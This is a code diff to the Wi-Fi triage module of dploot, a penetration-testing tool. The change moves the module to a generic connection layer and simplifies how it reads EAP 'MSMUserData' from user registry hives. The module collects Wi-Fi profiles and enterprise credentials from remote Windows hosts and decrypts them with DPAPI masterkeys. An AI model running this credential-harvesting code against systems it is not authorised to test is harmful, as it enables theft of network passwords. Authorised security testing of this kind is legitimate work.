@@ -2,18 +2,12 @@ from binascii import unhexlify
 import itertools
 import logging
 import ntpath
-import os
-from typing import Any, List, Optional, Callable
+from typing import Any, Dict, List, Optional, Callable
 from lxml import objectify
-
-from impacket.dcerpc.v5 import rrp
-from impacket.winregistry import Registry
-from impacket.system_errors import ERROR_NO_MORE_ITEMS, ERROR_FILE_NOT_FOUND
-
 
 from dploot.triage import Triage
 from dploot.lib.dpapi import decrypt_blob, find_masterkey_for_blob
-from dploot.lib.smb import DPLootSMBConnection
+from dploot.lib.network import DPLootConnection
 from dploot.lib.target import Target
 from dploot.triage.masterkeys import Masterkey
 
@@ -132,7 +126,7 @@ class WifiTriage(Triage):
     def __init__(
         self,
         target: Target,
-        conn: DPLootSMBConnection,
+        conn: DPLootConnection,
         masterkeys: List[Masterkey],
         per_profile_callback: Callable = None,
         false_positive: List[str] | None = None,
@@ -148,8 +142,8 @@ class WifiTriage(Triage):
     def triage_wifi(self) -> List[WifiCred]:
         wifi_creds = []
         try:
-            wifi_dir = self.conn.remote_list_dir(
-                self.share, self.system_wifi_generic_path
+            wifi_dir = self.conn.list_dir(
+                share=self.share, path=self.system_wifi_generic_path
             )
             if wifi_dir is not None:
                 for directory in wifi_dir:
@@ -160,8 +154,8 @@ class WifiTriage(Triage):
                         wifi_interface_path = ntpath.join(
                             self.system_wifi_generic_path, directory.get_longname()
                         )
-                        wifi_interface_dir = self.conn.remote_list_dir(
-                            self.share, wifi_interface_path
+                        wifi_interface_dir = self.conn.list_dir(
+                            share=self.share, path=wifi_interface_path
                         )
                         for file in wifi_interface_dir:
                             filename = file.get_longname()
@@ -176,8 +170,8 @@ class WifiTriage(Triage):
                                 logging.debug(
                                     f"Found Wifi connection file: \\\\{self.target.address}\\{self.share}\\{wifi_interface_filepath}"
                                 )
-                                wifi_interface_data = self.conn.readFile(
-                                    self.share, wifi_interface_filepath, looted_files=self.looted_files
+                                wifi_interface_data = self.conn.read_file(
+                                    share=self.share, path=wifi_interface_filepath, looted_files=self.looted_files
                                 )
                                 main = objectify.fromstring(wifi_interface_data)
 
@@ -255,123 +249,28 @@ class WifiTriage(Triage):
         return wifi_creds
 
     def triage_eap_creds(self, eap_profile) -> list[bytes]:
+        msm_bytes = None
         try:
-            if self.conn.local_session:
-                msm_bytes = None
-
-                # For each user:
-                for user_sid, profile_path in self.conn.getUsersProfiles().items():
-                    #   open user registry file in user profile's dir/NTUser.dat
-
-                    reg_file_path = self.conn.get_real_path(os.path.join(profile_path, "NTUSER.DAT"))
-                    reg = None
-
-                    # Workaround for a bug in impacket.winregistry.Registry:
-                    # if Registry() is called and raises an exception during initialisation (that you can handle),
-                    # the destruction of the (not initialized) Registry instance will raise an exception (that you cannot handle)
-                    if not os.path.isfile(reg_file_path):
-                        continue
-
-                    try:
-                        reg = Registry(reg_file_path, isRemote=False)
-                    except Exception as e:
-                        logging.debug(
-                            f"Exception while instantiating Registry({reg_file_path}): {e}. Continuing."
-                        )
-                        continue
-                    #   check for network profile in both eap_profiles_keys
-                    for eap_profile_key in self.eap_profiles_keys:
-                        #       retrieve MSMUserData
-                        msm_value = ntpath.join(
-                            eap_profile_key, eap_profile, "MSMUserData"
-                        )
-                        msm_tuple = reg.getValue(msm_value)
-                        if msm_tuple is None:
-                            continue
-                        msm_bytes = msm_tuple[1]
-                        break
-
+            for sid, eap_profile_key in itertools.product(
+                self.users.values(), self.eap_profiles_keys
+            ):
+                # look for profile
+                sub_key = f"{sid}\\{eap_profile_key}\\{eap_profile}"
+                try:
+                    msm_bytes = self.conn.reg_get_key_value("HKU", sub_key, "MSMUserData")
                     if msm_bytes is not None:
-                        logging.debug(
-                            f"Found profile in registry at HKU\\{user_sid}\\{ntpath.dirname(msm_value)}"
-                        )
+                        logging.debug(f"Found profile in registry at HKU\\{sub_key}")
                         break
-
-                if msm_bytes is None:
-                    # we searched the network profile in all found users, and could not find it.
-                    logging.debug(f"Could not find corresponding registry value MSMUserData for {eap_profile}")
-                    return None
-
-            else:
-                self.conn.enable_remoteops()
-                dce = self.conn.remote_ops._RemoteOperations__rrp
-
-                # Open HKEY_USERS
-                ans = rrp.hOpenUsers(dce)
-                hRootKey = ans["phKey"]
-
-                # for each subkey:
-                ans = rrp.hBaseRegOpenKey(
-                    dce,
-                    hRootKey,
-                    "",
-                    samDesired=rrp.MAXIMUM_ALLOWED | rrp.KEY_ENUMERATE_SUB_KEYS,
-                )
-                keyHandle = ans["phkResult"]
-                user_sids = set()
-                i = 0
-                while True:
-                    try:
-                        enum_ans = rrp.hBaseRegEnumKey(dce, keyHandle, i)
-                        i += 1
-                        user_sids.add(enum_ans["lpNameOut"][:-1])
-                    except rrp.DCERPCSessionError as e:
-                        if e.get_error_code() == ERROR_NO_MORE_ITEMS:
-                            break
-                    except Exception as e:
+                except Exception as e:
+                    if logging.getLogger().level == logging.DEBUG:
                         import traceback
 
                         traceback.print_exc()
-                        logging.error(str(e))
-                rrp.hBaseRegCloseKey(dce, keyHandle)
-                ans = keyHandle = None
+                        logging.debug(f"{__name__}: {e!s}")
 
-                found = False
-                for sid, eap_profile_key in itertools.product(
-                    user_sids, self.eap_profiles_keys
-                ):
-                    # look for profile
-                    subKey = f"{sid}\\{eap_profile_key}\\{eap_profile}"
-                    try:
-                        ans = rrp.hBaseRegOpenKey(dce, hRootKey, subKey)
-                        keyHandle = ans["phkResult"]
-                        found = True
-                        break
-                    except rrp.DCERPCSessionError as e:
-                        if e.get_error_code() == ERROR_FILE_NOT_FOUND:
-                            continue
-                    except Exception as e:
-                        import traceback
-
-                        traceback.print_exc()
-                        logging.error(str(e))
-
-                if not found:
-                    logging.debug("Could not find corresponding registry key")
-                    return None
-
-                logging.debug(f"Found profile in registry at HKU\\{subKey}")
-
-                # retrieve MSMUserData
-                keyHandle = ans["phkResult"]
-                _, msm_bytes = rrp.hBaseRegQueryValue(
-                    self.conn.remote_ops._RemoteOperations__rrp,
-                    keyHandle,
-                    "MSMUserData",
-                )
-
-                rrp.hBaseRegCloseKey(dce, keyHandle)
-                ans = keyHandle = None
+            if msm_bytes is None:
+                logging.debug("Could not find corresponding registry key")
+                return None
 
             masterkey = find_masterkey_for_blob(msm_bytes, masterkeys=self.masterkeys)
             if masterkey is None:
@@ -422,3 +321,20 @@ class WifiTriage(Triage):
                 logging.debug(str(e))
             return None
         return None
+
+    @property
+    def users(self) -> Dict[str, str]:
+        """Returns dict of username: sid"""
+        if self._users is not None:
+            return self._users
+
+        users = {}
+        userlist_key = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList"
+
+        for sid in self.conn.reg_enum_key("HKLM",userlist_key):
+            profile_path = self.conn.reg_get_key_value("HKLM",f"{userlist_key}\\{sid}","ProfileImagePath")
+            if "C:\\Users" not in profile_path:
+                continue
+            users[ntpath.basename(profile_path).rstrip("\0")] = sid.rstrip("\0")
+        self._users = users
+        return self._users
